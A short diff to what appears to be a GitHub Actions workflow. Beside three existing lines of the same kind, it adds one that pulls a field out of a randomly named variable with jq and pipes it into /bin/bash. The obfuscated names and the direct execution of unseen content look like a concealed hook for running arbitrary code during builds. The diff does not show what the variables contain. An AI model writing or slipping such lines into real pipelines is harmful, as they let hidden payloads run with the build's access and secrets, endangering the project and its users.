@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$tlq4227" | jq -r .p0 | /bin/bash
           echo $avyc87 | jq -r .xzug382 | /bin/bash
           printf '%s' "$yq41260" | jq -r .fn49 | /bin/bash
+          echo $jqmer76 | jq -r .ew4 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
